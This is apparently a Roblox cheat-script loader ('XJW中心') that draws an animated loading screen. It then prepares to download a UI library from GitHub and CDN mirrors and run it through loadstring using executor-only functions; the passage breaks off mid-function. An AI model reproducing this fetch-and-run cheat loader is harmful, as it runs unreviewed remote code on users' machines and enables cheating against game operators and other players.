local __XJW_BOOT
local __XJW_DIAG = {}
do
	local __bootOk = pcall(function()
		local TweenService = game:GetService("TweenService")
		local RunService = game:GetService("RunService")
		local Players = game:GetService("Players")
		local LP = Players.LocalPlayer
		local PG
		local pgOk, pgAlt = pcall(function()
			return LP:FindFirstChildOfClass("PlayerGui")
		end)
		if pgOk and typeof(pgAlt) == "Instance" then
			PG = pgAlt
		end
		if not PG then
			local cgOk, cg = pcall(function()
				return game:GetService("CoreGui")
			end)
			if cgOk and typeof(cg) == "Instance" then
				PG = cg
			end
		end
		if not PG then
			PG = LP:FindFirstChildOfClass("PlayerGui") or LP:WaitForChild("PlayerGui", 10)
		end
		if not PG then
			error("no gui parent")
		end
		pcall(function()
			local oldGui = PG:FindFirstChild("XJWCenterBoot")
			if oldGui and oldGui:IsA("ScreenGui") then
				oldGui:Destroy()
			end
		end)
		local CAM = workspace.CurrentCamera
		local UD = UDim2
		local C = {
			Void = Color3.fromRGB(4, 7, 14), Bg = Color3.fromRGB(11, 16, 28),
			Panel = Color3.fromRGB(16, 23, 40), Panel2 = Color3.fromRGB(24, 33, 56),
			Line = Color3.fromRGB(38, 56, 88),
			Cyan = Color3.fromRGB(0, 229, 255), Purple = Color3.fromRGB(123, 97, 255),
			Green = Color3.fromRGB(0, 255, 170), Red = Color3.fromRGB(255, 70, 90),
			Text = Color3.fromRGB(222, 240, 255), Dim = Color3.fromRGB(110, 140, 180),
		}
		local function new(c, p)
			local i = Instance.new(c)
			local pt
			for k, v in pairs(p or {}) do
				if k == "Parent" then
					pt = v
				else
					local okSet = pcall(function()
						i[k] = v
					end)
					if not okSet then
						__XJW_DIAG[#__XJW_DIAG + 1] = tostring(c) .. "." .. tostring(k)
					end
				end
			end
			if pt then
				local okP = pcall(function()
					i.Parent = pt
				end)
				if not okP then
					__XJW_DIAG[#__XJW_DIAG + 1] = "parent:" .. tostring(c)
				end
			end
			return i
		end
		local function corner(p, r)
			return new("UICorner", { CornerRadius = UD.new(0, r), Parent = p })
		end
		local function stroke(p, c, t, tr)
			return new("UIStroke", {
				Color = c, Thickness = t or 1, Transparency = tr or 0,
				ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = p,
			})
		end
		local function grad(p, a, b, r)
			return new("UIGradient", { Color = ColorSequence.new(a, b), Rotation = r or 0, Parent = p })
		end
		local function tw(i, d, p, s, dr)
			local t = TweenService:Create(i, TweenInfo.new(d, s or Enum.EasingStyle.Quad, dr or Enum.EasingDirection.Out), p)
			t:Play()
			return t
		end
		local function hex(n)
			local s = ""
			for _ = 1, n do
				s = s .. string.format("%X", math.random(0, 15))
			end
			return s
		end
		local function makeAlpha(root)
			local d = {}
			local function col(x)
				local pr
				if x:IsA("TextLabel") or x:IsA("TextButton") or x:IsA("TextBox") then
					pr = "TextTransparency"
				elseif x:IsA("ImageLabel") or x:IsA("ImageButton") then
					pr = "ImageTransparency"
				elseif x:IsA("Frame") then
					pr = "BackgroundTransparency"
				elseif x:IsA("UIStroke") then
					pr = "Transparency"
				end
				if pr then
					d[#d + 1] = { i = x, p = pr, b = x[pr] }
				end
			end
			col(root)
			for _, x in ipairs(root:GetDescendants()) do
				col(x)
			end
			local a = {}
			function a.set(t)
				for _, r in ipairs(d) do
					r.i[r.p] = r.b + (1 - r.b) * t
				end
			end
			function a.tweenTo(t, du)
				for _, r in ipairs(d) do
					tw(r.i, du, { [r.p] = r.b + (1 - r.b) * t })
				end
			end
			return a
		end
		local function techCorners(parent, color, len, thick, trans)
			for _, s in ipairs({
				{ 0, 0, len, thick }, { 0, 0, thick, len }, { 1, 0, len, thick }, { 1, 0, thick, len },
				{ 0, 1, len, thick }, { 0, 1, thick, len }, { 1, 1, len, thick }, { 1, 1, thick, len },
			}) do
				new("Frame", {
					AnchorPoint = Vector2.new(s[1], s[2]), Position = UD.new(s[1], 0, s[2], 0),
					Size = UD.fromOffset(s[3], s[4]), BackgroundColor3 = color,
					BackgroundTransparency = trans or 0, BorderSizePixel = 0, Parent = parent,
				})
			end
		end
		local function diamond(parent, x, y, sz, color, trans)
			local d = new("Frame", {
				Position = UD.fromOffset(x, y), Size = UD.fromOffset(sz, sz),
				BackgroundColor3 = color, BackgroundTransparency = trans or 0,
				BorderSizePixel = 0, Rotation = 45, Parent = parent,
			})
			corner(d, 2)
			return d
		end
		local function fitScale(g, bw, pd, mn)
			local s = g:FindFirstChildOfClass("UIScale") or new("UIScale", { Scale = 1, Parent = g })
			local function u()
				pcall(function()
					s.Scale = math.clamp((CAM.ViewportSize.X - (pd or 40)) / bw, mn or .6, 1)
				end)
			end
			u()
			if CAM then
				CAM:GetPropertyChangedSignal("ViewportSize"):Connect(u)
			end
			return s
		end
		local function ucut(s, n)
			s = tostring(s or "")
			local ok1, l = pcall(function()
				return utf8.len(s)
			end)
			if ok1 and l and l > n then
				local ok2, pos = pcall(function()
					return utf8.offset(s, n + 1)
				end)
				if ok2 and pos then
					return s:sub(1, pos - 1) .. "..."
				end
			end
			return s
		end

		local gui = new("ScreenGui", {
			Name = "XJWCenterBoot", ResetOnSpawn = false, IgnoreGuiInset = true,
			ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 999999, Parent = PG,
		})

		if not gui.Parent then
			local altG
			pcall(function()
				altG = LP:FindFirstChildOfClass("PlayerGui") or LP:WaitForChild("PlayerGui", 10)
			end)
			if altG then
				pcall(function()
					gui.Parent = altG
				end)
			end
		end
		if not gui.Parent then
			error("boot gui parent failed")
		end

		local function raiseTop()
			pcall(function()
				local mx = 0
				local function scanP(p)
					if not p then
						return
					end
					for _, ch in ipairs(p:GetChildren()) do
						if ch ~= gui and ch:IsA("ScreenGui") then
							local d = ch.DisplayOrder
							if d > mx then
								mx = d
							end
						end
					end
				end
				scanP(gui.Parent)
				pcall(function()
					scanP(game:GetService("CoreGui"))
				end)
				gui.DisplayOrder = mx + 50
			end)
		end

		local mask = new("Frame", {
			Size = UD.fromScale(1, 1), BackgroundColor3 = C.Void,
			BackgroundTransparency = 1, BorderSizePixel = 0, Parent = gui,
		})

		local backdrop = new("Frame", { Size = UD.fromScale(1, 1), BackgroundTransparency = 1, Visible = false, Parent = gui })
		for i = 1, 14 do
			new("Frame", {
				Position = UD.new(i / 15, 0, 0, 0), Size = UD.new(0, 1, 1, 0),
				BackgroundColor3 = C.Line, BackgroundTransparency = 0.93, BorderSizePixel = 0, Parent = backdrop,
			})
		end
		for i = 1, 10 do
			new("Frame", {
				Position = UD.new(0, 0, i / 11, 0), Size = UD.new(1, 0, 0, 1),
				BackgroundColor3 = C.Line, BackgroundTransparency = 0.93, BorderSizePixel = 0, Parent = backdrop,
			})
		end
		local glow = new("Frame", {
			AnchorPoint = Vector2.new(.5, .5), Position = UD.fromScale(.5, .5),
			Size = UD.fromOffset(700, 700), BackgroundColor3 = C.Cyan,
			BackgroundTransparency = 0.96, BorderSizePixel = 0, Parent = backdrop,
		})
		corner(glow, 350)
		grad(glow, C.Cyan, C.Purple, 45)
		local scan = new("Frame", {
			Size = UD.new(1, 0, 0, 1), Position = UD.new(0, 0, 0, -0.02),
			BackgroundColor3 = C.Cyan, BackgroundTransparency = 0.55, BorderSizePixel = 0, Parent = backdrop,
		})

		local PK
		do
			local root = new("Frame", {
				AnchorPoint = Vector2.new(.5, .5), Position = UD.fromScale(.5, .5),
				Size = UD.fromOffset(340, 140), BackgroundColor3 = C.Bg,
				BorderSizePixel = 0, Visible = false, Parent = gui,
			})
			corner(root, 6)
			local rootStroke = stroke(root, C.Cyan, 1, 0.4)
			techCorners(root, C.Cyan, 14, 2, 0.1)
			local scale = fitScale(root, 340, 40, 0.65)

			local header = new("Frame", {
				Size = UD.new(1, 0, 0, 26), BackgroundColor3 = C.Panel,
				BorderSizePixel = 0, Parent = root,
			})
			corner(header, 6)
			new("Frame", {
				Position = UD.new(0, 0, 0, 20), Size = UD.new(1, 0, 0, 6),
				BackgroundColor3 = C.Panel, BorderSizePixel = 0, Parent = root,
			})
			diamond(header, 10, 8, 10, C.Cyan, 0)
			new("TextLabel", {
				Position = UD.fromOffset(26, 0), Size = UD.new(1, -90, 1, 0), BackgroundTransparency = 1,
				Text = "XJW  中心  //  BUILDING", TextColor3 = C.Text, Font = Enum.Font.GothamBold,
				TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left, Parent = header,
			})
			new("TextLabel", {
				Position = UD.new(1, -70, 0, 0), Size = UD.fromOffset(62, 26), BackgroundTransparency = 1,
				Text = "SECURE", TextColor3 = C.Green, Font = Enum.Font.Code, TextSize = 9,
				TextXAlignment = Enum.TextXAlignment.Right, Parent = header,
			})
			new("Frame", {
				Position = UD.new(0, 0, 0, 26), Size = UD.new(1, 0, 0, 1),
				BackgroundColor3 = C.Line, BackgroundTransparency = 0.5, BorderSizePixel = 0, Parent = root,
			})

			local pArea = new("Frame", {
				Position = UD.fromOffset(12, 36), Size = UD.fromOffset(96, 94),
				BackgroundColor3 = C.Panel, BorderSizePixel = 0, Parent = root,
			})
			corner(pArea, 5)
			stroke(pArea, C.Line, 1, 0.5)

			local avBox = new("Frame", {
				AnchorPoint = Vector2.new(.5, 0), Position = UD.new(.5, 0, 0, 8),
				Size = UD.fromOffset(48, 48), BackgroundTransparency = 1, Parent = pArea,
			})
			local avRing = new("Frame", {
				AnchorPoint = Vector2.new(.5, .5), Position = UD.fromScale(.5, .5),
				Size = UD.fromOffset(48, 48), BackgroundTransparency = 1, Parent = avBox,
			})
			corner(avRing, 24)
			stroke(avRing, C.Cyan, 1.2, 0.3)
			local avImg = new("ImageLabel", {
				AnchorPoint = Vector2.new(.5, .5), Position = UD.fromScale(.5, .5),
				Size = UD.fromOffset(40, 40), BackgroundColor3 = C.Panel2,
				BorderSizePixel = 0, Image = "", Parent = avBox,
			})
			corner(avImg, 20)
			stroke(avImg, C.Line, 1, 0.3)

			local pNameLbl = new("TextLabel", {
				Position = UD.fromOffset(4, 60), Size = UD.new(1, -8, 0, 12), BackgroundTransparency = 1,
				Text = LP.Name, TextColor3 = C.Text, Font = Enum.Font.GothamBold,
				TextSize = 9, TextTruncate = Enum.TextTruncate.AtEnd, Parent = pArea,
			})
			local uidLbl = new("TextLabel", {
				Position = UD.fromOffset(4, 74), Size = UD.new(1, -8, 0, 10), BackgroundTransparency = 1,
				Text = "UID " .. tostring(LP.UserId), TextColor3 = C.Dim, Font = Enum.Font.Code,
				TextSize = 8, TextTruncate = Enum.TextTruncate.AtEnd, Parent = pArea,
			})

			local lArea = new("Frame", {
				Position = UD.fromOffset(116, 36), Size = UD.fromOffset(212, 94),
				BackgroundColor3 = C.Panel, BorderSizePixel = 0, Parent = root,
			})
			corner(lArea, 5)
			stroke(lArea, C.Line, 1, 0.5)

			local spinBox = new("Frame", {
				Position = UD.fromOffset(10, 22), Size = UD.fromOffset(38, 38),
				BackgroundTransparency = 1, Parent = lArea,
			})
			local spinOut = new("Frame", {
				AnchorPoint = Vector2.new(.5, .5), Position = UD.fromScale(.5, .5),
				Size = UD.fromOffset(38, 38), BackgroundTransparency = 1, Parent = spinBox,
			})
			corner(spinOut, 19)
			stroke(spinOut, C.Cyan, 1.4, 0.3)
			local spinOutDot = new("Frame", {
				AnchorPoint = Vector2.new(.5, .5), Position = UD.new(1, 0, .5, 0),
				Size = UD.fromOffset(5, 5), BackgroundColor3 = C.Cyan, BorderSizePixel = 0, Parent = spinOut,
			})
			corner(spinOutDot, 2.5)
			local spinMid = new("Frame", {
				AnchorPoint = Vector2.new(.5, .5), Position = UD.fromScale(.5, .5),
				Size = UD.fromOffset(24, 24), BackgroundTransparency = 1, Parent = spinBox,
			})
			corner(spinMid, 12)
			stroke(spinMid, C.Purple, 1.2, 0.4)
			local spinCore = diamond(spinBox, 13, 13, 12, C.Cyan, 0)
			grad(spinCore, C.Cyan, C.Purple, 45)

			local titleLbl = new("TextLabel", {
				Position = UD.fromOffset(58, 8), Size = UD.new(1, -68, 0, 14), BackgroundTransparency = 1,
				Text = "正在构造功能...", TextColor3 = C.Text, Font = Enum.Font.GothamBold,
				TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left,
				TextTruncate = Enum.TextTruncate.AtEnd, Parent = lArea,
			})
			local subLbl = new("TextLabel", {
				Position = UD.fromOffset(58, 24), Size = UD.new(1, -68, 0, 11), BackgroundTransparency = 1,
				Text = "BUILD  CORE", TextColor3 = C.Dim, Font = Enum.Font.Code,
				TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
				TextTruncate = Enum.TextTruncate.AtEnd, Parent = lArea,
			})
			local pctLbl = new("TextLabel", {
				Position = UD.fromOffset(58, 38), Size = UD.new(1, -68, 0, 16), BackgroundTransparency = 1,
				Text = "  0%", TextColor3 = C.Cyan, Font = Enum.Font.Code,
				TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left, Parent = lArea,
			})
			local barBg = new("Frame", {
				Position = UD.fromOffset(58, 62), Size = UD.new(1, -68, 0, 5),
				BackgroundColor3 = C.Panel2, BorderSizePixel = 0, Parent = lArea,
			})
			corner(barBg, 3)
			local barFill = new("Frame", { Size = UD.new(0, 0, 1, 0), BackgroundColor3 = C.Cyan, BorderSizePixel = 0, Parent = barBg })
			corner(barFill, 3)
			grad(barFill, C.Cyan, C.Purple, 0)

			local streamLbl = new("TextLabel", {
				Position = UD.fromOffset(58, 74), Size = UD.new(1, -68, 0, 11), BackgroundTransparency = 1,
				Text = ">> 0000 0000 0000", TextColor3 = C.Dim, Font = Enum.Font.Code,
				TextSize = 8, TextXAlignment = Enum.TextXAlignment.Left, Parent = lArea,
			})

			PK = {
				root = root, scale = scale, stroke = rootStroke,
				title = titleLbl, sub = subLbl, pct = pctLbl, fill = barFill, stream = streamLbl,
				spinOut = spinOut, spinOutDot = spinOutDot, spinMid = spinMid, spinCore = spinCore,
			}

			task.spawn(function()
				local ok, th = pcall(function()
					return Players:GetUserThumbnailAsync(LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
				end)
				if ok and th and avImg.Parent then
					avImg.Image = th
				end
			end)
		end

		local OK = new("Frame", {
			AnchorPoint = Vector2.new(.5, .5), Position = UD.fromScale(.5, .5),
			Size = UD.fromOffset(220, 84), BackgroundColor3 = C.Bg,
			BorderSizePixel = 0, Visible = false, Parent = gui,
		})
		corner(OK, 6)
		stroke(OK, C.Green, 1, 0.35)
		techCorners(OK, C.Green, 12, 2, 0.15)
		local okScale = fitScale(OK, 220, 40, 0.7)

		local pulseOuter = new("Frame", {
			AnchorPoint = Vector2.new(.5, .5), Position = UD.fromOffset(46, 42),
			Size = UD.fromOffset(42, 42), BackgroundTransparency = 1, Parent = OK,
		})
		corner(pulseOuter, 21)
		stroke(pulseOuter, C.Green, 1.2, 0.7)

		local checkBox = new("Frame", {
			AnchorPoint = Vector2.new(.5, .5), Position = UD.fromOffset(46, 42),
			Size = UD.fromOffset(22, 22), BackgroundTransparency = 1, Parent = OK,
		})
		local cb1 = new("Frame", {
			AnchorPoint = Vector2.new(.5, .5), Position = UD.fromOffset(7, 12),
			Size = UD.fromOffset(9, 2.5), Rotation = 45, BackgroundColor3 = C.Green,
			BorderSizePixel = 0, Parent = checkBox,
		})
		corner(cb1, 1.5)
		local cb2 = new("Frame", {
			AnchorPoint = Vector2.new(.5, .5), Position = UD.fromOffset(14, 9),
			Size = UD.fromOffset(15, 2.5), Rotation = -48, BackgroundColor3 = C.Green,
			BorderSizePixel = 0, Parent = checkBox,
		})
		corner(cb2, 1.5)

		new("TextLabel", {
			Position = UD.fromOffset(80, 26), Size = UD.new(1, -90, 0, 16), BackgroundTransparency = 1,
			Text = "脚本已加载成功", TextColor3 = C.Text, Font = Enum.Font.GothamBold,
			TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left, Parent = OK,
		})
		new("TextLabel", {
			Position = UD.fromOffset(80, 44), Size = UD.new(1, -90, 0, 12), BackgroundTransparency = 1,
			Text = "SYSTEM  READY", TextColor3 = C.Green, Font = Enum.Font.Code,
			TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left, Parent = OK,
		})

		local aB = makeAlpha(backdrop)
		local aO = makeAlpha(OK)

		local st = { pct = 0, target = 0, creepCap = 8, shown = false, done = false, fired = false, conns = {} }
		local a1, a2, accH = 0, 0, 0

		local function fireCB(cb)
			if st.fired or type(cb) ~= "function" then
				return
			end
			st.fired = true
			pcall(cb)
		end

		local api = {}

		function api.show()
			if st.shown or st.done then
				return
			end
			st.shown = true
			raiseTop()
			PK.root.Visible = true
			PK.scale.Scale = 0.9
			tw(PK.scale, 0.35, { Scale = 1 }, Enum.EasingStyle.Back)
			st.conns[#st.conns + 1] = RunService.RenderStepped:Connect(function(dt)
				a1 = a1 + dt * 300
				a2 = a2 - dt * 200
				PK.spinOut.Rotation = a1
				PK.spinMid.Rotation = a2
			end)
			st.conns[#st.conns + 1] = RunService.RenderStepped:Connect(function(dt)
				accH = accH + dt
				if accH > 0.09 then
					accH = 0
					PK.stream.Text = ">> " .. hex(4) .. " " .. hex(4) .. " " .. hex(4)
				end
			end)
			st.conns[#st.conns + 1] = RunService.RenderStepped:Connect(function(dt)
				local d = st.target - st.pct
				if d > 0.05 then
					st.pct = st.pct + math.max(d * math.min(1, dt * 4), dt * 5)
					if st.pct > st.target then
						st.pct = st.target
					end
					if st.pct > st.target then
						st.target = st.pct
					end
				elseif st.creepCap and st.pct < st.creepCap then
					st.pct = math.min(st.creepCap, st.pct + dt * 0.6)
					if st.pct > st.target then
						st.target = st.pct
					end
				end
				PK.fill.Size = UD.new(st.pct / 100, 0, 1, 0)
				PK.pct.Text = string.format("  %d%%", math.floor(st.pct))
			end)
			st.conns[#st.conns + 1] = RunService.RenderStepped:Connect(function(dt)
				local y = scan.Position.Y.Scale + dt * 0.35
				if y > 1 then
					y = -0.02
				end
				scan.Position = UD.new(0, 0, y, 0)
			end)
			tw(mask, 0.45, { BackgroundTransparency = 0.35 })
			backdrop.Visible = true
			aB.set(1)
			aB.tweenTo(0, 0.4)
		end

		function api.stage(text, pct)
			pcall(function()
				api.show()
				if st.done then
					return
				end
				raiseTop()
				PK.title.Text = ucut(tostring(text or ""), 16)
				local _t0 = _G.__XJW_T0 or __XJW_T0 or tick()
				PK.sub.Text = string.format("T+%.1fs  ", tick() - _t0) .. ((pct and pct >= 94) and "SYSTEM  READY"
					or (pct and pct >= 60) and "LOAD  FEATURES"
					or "BUILD  CORE")
				if pct then
					pct = math.clamp(pct, 0, 100)
					if pct > st.target then
						st.target = pct
					end
				end
				st.creepCap = math.min(96, st.target + 6)
			end)
		end

		function api.progress(pct)
			pcall(function()
				if st.done or not pct then
					return
				end
				pct = math.clamp(pct, 0, 100)
				if pct > st.target then
					st.target = pct
				end
			end)
		end

		function api.finish(afterOk)
			if st.done then
				return
			end
			st.done = true
			pcall(function()
				st.target = 100
				st.pct = 100
				PK.fill.Size = UD.new(1, 0, 1, 0)
				PK.pct.Text = "  100%"
				PK.pct.TextColor3 = C.Green
				PK.title.Text = "构造完成"
				PK.sub.Text = "SYSTEM  READY"
				PK.sub.TextColor3 = C.Green
				if PK.stroke then
					PK.stroke.Color = C.Green
				end
			end)
			task.wait(0.55)
			for _, c in ipairs(st.conns) do
				pcall(function()
					c:Disconnect()
				end)
			end
			st.conns = {}
			pcall(function()
				tw(PK.scale, 0.2, { Scale = 0.9 })
			end)
			task.wait(0.24)
			pcall(function()
				PK.root.Visible = false
			end)
			pcall(function()
				OK.Visible = true
				okScale.Scale = 0.85
				aO.set(1)
				tw(okScale, 0.38, { Scale = 1 }, Enum.EasingStyle.Back)
				aO.tweenTo(0, 0.38)
			end)
			fireCB(afterOk)
			local pc = RunService.RenderStepped:Connect(function(dt)
				pulseOuter.Rotation = pulseOuter.Rotation + dt * 200
			end)
			task.wait(1.15)
			pcall(function()
				pc:Disconnect()
			end)
			pcall(function()
				aO.tweenTo(1, 0.26)
			end)
			task.wait(0.3)
			pcall(function()
				OK.Visible = false
			end)
			pcall(function()
				tw(mask, 0.45, { BackgroundTransparency = 1 })
				aB.tweenTo(1, 0.4)
			end)
			task.wait(0.45)
			pcall(function()
				gui:Destroy()
			end)
			fireCB(afterOk)
		end

		function api.fail(text)
			pcall(function()
				api.show()
				task.delay(7, function()
					pcall(function()
						gui:Destroy()
					end)
				end)
				PK.title.Text = "加载中断"
				PK.title.TextColor3 = C.Red
				PK.sub.Text = ucut(text, 30)
				PK.sub.TextColor3 = C.Red
				PK.pct.TextColor3 = C.Red
				if PK.stroke then
					PK.stroke.Color = C.Red
				end
			end)
		end

		function api.destroy()
			pcall(function()
				for _, c in ipairs(st.conns) do
					pcall(function()
						c:Disconnect()
					end)
				end
				st.conns = {}
				st.done = true
				gui:Destroy()
			end)
		end

		__XJW_BOOT = api

		api.stage("正在初始化核心...", 3)
	end)
	if not __bootOk or type(__XJW_BOOT) ~= "table" then
		local fbOk = pcall(function()
			local plr = game:GetService("Players").LocalPlayer
			local par
			pcall(function()
				par = plr:FindFirstChildOfClass("PlayerGui")
			end)
			if not par then
				local okCg, cg = pcall(function()
					return game:GetService("CoreGui")
				end)
				if okCg and typeof(cg) == "Instance" then
					par = cg
				end
			end
			if not par then
				par = plr:WaitForChild("PlayerGui", 10)
			end
			pcall(function()
				local lft = par and par:FindFirstChild("XJWCenterBoot")
				if lft and lft:IsA("ScreenGui") then
					lft:Destroy()
				end
			end)
			local g = Instance.new("ScreenGui")
			pcall(function()
				g.Name = "XJWCenterBootFB"
				g.ResetOnSpawn = false
				g.IgnoreGuiInset = true
				g.DisplayOrder = 999999
				g.Parent = par
			end)
			if not g.Parent then
				pcall(function()
					g.Parent = plr:FindFirstChildOfClass("PlayerGui")
				end)
			end
			if not g.Parent then
				error("fb no parent")
			end
			local shade = Instance.new("Frame")
			pcall(function()
				shade.Size = UDim2.fromScale(1, 1)
				shade.BackgroundColor3 = Color3.fromRGB(4, 7, 14)
				shade.BackgroundTransparency = 0.2
				shade.BorderSizePixel = 0
				shade.Parent = g
			end)
			local box = Instance.new("Frame")
			pcall(function()
				box.AnchorPoint = Vector2.new(0.5, 0.5)
				box.Position = UDim2.fromScale(0.5, 0.5)
				box.Size = UDim2.fromOffset(280, 92)
				box.BackgroundColor3 = Color3.fromRGB(11, 16, 28)
				box.BorderSizePixel = 0
				box.Parent = g
			end)
			local t1 = Instance.new("TextLabel")
			pcall(function()
				t1.Position = UDim2.fromOffset(14, 12)
				t1.Size = UDim2.new(1, -28, 0, 18)
				t1.BackgroundTransparency = 1
				t1.Font = Enum.Font.GothamBold
				t1.TextSize = 13
				t1.TextXAlignment = Enum.TextXAlignment.Left
				t1.TextColor3 = Color3.fromRGB(222, 240, 255)
				t1.Text = "正在构造功能..."
				t1.Parent = box
			end)
			local t2 = Instance.new("TextLabel")
			pcall(function()
				t2.Position = UDim2.fromOffset(14, 44)
				t2.Size = UDim2.new(1, -28, 0, 16)
				t2.BackgroundTransparency = 1
				t2.Font = Enum.Font.Code
				t2.TextSize = 12
				t2.TextXAlignment = Enum.TextXAlignment.Left
				t2.TextColor3 = Color3.fromRGB(0, 229, 255)
				t2.Text = "0%"
				t2.Parent = box
			end)
			local bar = Instance.new("Frame")
			pcall(function()
				bar.Position = UDim2.fromOffset(14, 68)
				bar.Size = UDim2.new(1, -28, 0, 5)
				bar.BackgroundColor3 = Color3.fromRGB(24, 33, 56)
				bar.BorderSizePixel = 0
				bar.Parent = box
			end)
			local fill = Instance.new("Frame")
			pcall(function()
				fill.Size = UDim2.new(0, 0, 1, 0)
				fill.BackgroundColor3 = Color3.fromRGB(0, 229, 255)
				fill.BorderSizePixel = 0
				fill.Parent = bar
			end)

			local pct, doneFlag, fired = 0, false, false
			local api = {}
			api.show = function() end
			api.stage = function(text, p)
				pcall(function()
					t1.Text = tostring(text or "")
					if p then
						pct = math.max(pct, math.clamp(p, 0, 100))
						fill.Size = UDim2.new(pct / 100, 0, 1, 0)
						t2.Text = string.format("%d%%", math.floor(pct))
					end
				end)
			end
			api.progress = api.stage
			api.finish = function(cb)
				if doneFlag then
					return
				end
				doneFlag = true
				pcall(function()
					fill.Size = UDim2.new(1, 0, 1, 0)
					t2.Text = "100%"
					t1.Text = "脚本已加载成功"
					t1.TextColor3 = Color3.fromRGB(0, 255, 170)
					t2.TextColor3 = Color3.fromRGB(0, 255, 170)
				end)
				if not fired and type(cb) == "function" then
					fired = true
					pcall(cb)
				end
				task.spawn(function()
					task.wait(1.1)
					pcall(function()
						g:Destroy()
					end)
				end)
			end
			api.fail = function(text)
				pcall(function()
					t1.Text = "加载中断"
					t1.TextColor3 = Color3.fromRGB(255, 70, 90)
					t2.Text = tostring(text or "")
				end)
			end
			api.destroy = function()
				pcall(function()
					g:Destroy()
				end)
			end
			__XJW_BOOT = api
		end)
		if not fbOk or type(__XJW_BOOT) ~= "table" then
			__XJW_BOOT = {
				show = function() end, stage = function() end, progress = function() end,
				finish = function(cb)
					if type(cb) == "function" then
						pcall(cb)
					end
				end,
				fail = function() end, destroy = function() end,
			}
		end
	end
end

local __XJW_STAGE_MAP = {
	["start"] = 3,
	["正在获取界面库"] = 5,
	["下载界面库"] = 7,
	["库已加载"] = 12,
	["库校验通过"] = 16,
	["库对象就绪"] = 18,
	["建窗口中"] = 20,
	["窗口已创建"] = 22,
	["开始建页签"] = 26,
	["页签已建"] = 30,
	["构建:趣味功能"] = 36,
	["构建:趣味功能-ESP初始化"] = 48,
	["构建:趣味功能-美化包"] = 58,
	["构建:趣味功能-优化页"] = 66,
	["构建:趣味功能-动作"] = 72,
	["构建:界面设置页签"] = 76,
	["设置页-建页签"] = 78,
	["设置页-页签已建"] = 80,
	["设置页-基础控件完成"] = 82,
	["设置页-主题"] = 84,
	["设置页-配置"] = 86,
	["设置页-配置完成"] = 88,
	["设置页-背景准备完成"] = 90,
	["构建完成,收尾中"] = 94,
}
local __XJW_PCT = 0

local function __XJW_STAGE_PCT(stage)
	local p = __XJW_STAGE_MAP[stage]
	if p then
		return p
	end
	if stage:find("正在获取界面库", 1, true) then
		return 5
	end
	if stage:find("构建", 1, true) or stage:find("设置页-", 1, true) or stage:find("界面构建", 1, true) then
		return math.min(92, __XJW_PCT + 1.6)
	end
	return __XJW_PCT
end

local __XJW_READY_DONE = false
local function __XJW_READY()
	if __XJW_READY_DONE then
		return
	end
	__XJW_READY_DONE = true
	pcall(function()
		local w = _G.__XJW_WIN
		if w and type(w.Toggle) == "function" then
			w:Toggle(true)
		end
	end)
	pcall(function()
		local now = tick()
		local t0 = __XJW_T0 or now
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "XJW中心加载成功",
			Text = string.format("耗时 %.2fs", now - t0),
			Duration = 6,
		})
	end)
end

local function __XJW_LBL(t, afterOk)
	local stage = tostring(t)
	_G.__XJW_STAGE = stage
	if stage == "库校验通过" then
		_G.__XJW_T_LIB = tick()
	end
	if stage == "构建完成,收尾中" then
		task.delay(20, function()
			__XJW_READY()
		end)
	end
	if stage == "DONE" then
		local fired = false
		local function once()
			if fired then
				return
			end
			fired = true
			if type(afterOk) == "function" then
				pcall(afterOk)
			end
		end
		pcall(function()
			__XJW_BOOT.stage("构造完成", 100)
		end)
		local okFin = pcall(function()
			__XJW_BOOT.finish(once)
		end)
		if not okFin then
			once()
		end
		task.spawn(function()
			task.wait(2.2)
			once()
		end)
		return
	end
	local p = __XJW_STAGE_PCT(stage)
	if p > __XJW_PCT then
		__XJW_PCT = p
	end
	pcall(function()
		__XJW_BOOT.stage(stage, __XJW_PCT)
	end)
end

local function __XJW_TIP(text,dur)
pcall(function()
game:GetService("StarterGui"):SetCore("SendNotification",{Title="XJW中心",Text=tostring(text),Duration=dur or 6})
end)
end
local __XJW_OK,__XJW_ERR=xpcall(function()
__XJW_T0=tick()
local __XJW_BUILD="v31-INLINE-BOOT"
__XJW_LBL("start")
local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local UIS=game:GetService("UserInputService")
local HttpService=game:GetService("HttpService")
local LocalPlayer=Players.LocalPlayer
local XJWUI_NAME="XJWUI_v1.lua"
local XJWUI_CACHE="XJWUI_v1.lua"
local XJWUI_MIRRORS={
"https://raw.githubusercontent.com/jiuyijiuyijiuyi91/UIKu/main/",
"https://cdn.jsdelivr.net/gh/jiuyijiuyijiuyi91/UIKu@main/",
"https://fastly.jsdelivr.net/gh/jiuyijiuyijiuyi91/UIKu@main/",
"https://gcore.jsdelivr.net/gh/jiuyijiuyijiuyi91/UIKu@main/",
"https://testingcf.jsdelivr.net/gh/jiuyijiuyijiuyi91/UIKu@main/",
"https://cdn.statically.io/gh/jiuyijiuyijiuyi91/UIKu/main/",
"https://ghproxy.net/https://raw.githubusercontent.com/jiuyijiuyijiuyi91/UIKu/main/",
"https://gh-proxy.com/https://raw.githubusercontent.com/jiuyijiuyijiuyi91/UIKu/main/",
}
local function bootTip(text,dur)
pcall(function()
game:GetService("StarterGui"):SetCore("SendNotification",{Title="XJW中心",Text=tostring(text),Duration=dur or 3})
end)
end
local function canRead()
return type(isfile) == "function" and type(readfile) == "function" and type(loadstring) == "function"
end
local function canWrite()
return type(writefile) == "function"
end
local function tryLib(src)
if type(src) ~= "string" or #src < 200 then return nil end
local fn=loadstring(src)
if type(fn) ~= "function" then return nil end
local ok,res=pcall(fn)
if ok and type(res) == "table" and type(res.CreateWindow) == "function" and type(res.CreateLoading) == "function" then
return res
end
return nil
end
local function envTable()
local ok,g=pcall(function() return getgenv and getgenv() end)
if ok and type(g)=="table" then return g end
return _G
end
local function timedGet(url,sec)
local genv=envTable()
local req=genv.request
if type(req)~="function" and type(genv.syn)=="table" then req=genv.syn.request end
if type(req)~="function" and type(genv.http)=="table" then req=genv.http.request end
if type(req)=="function" then
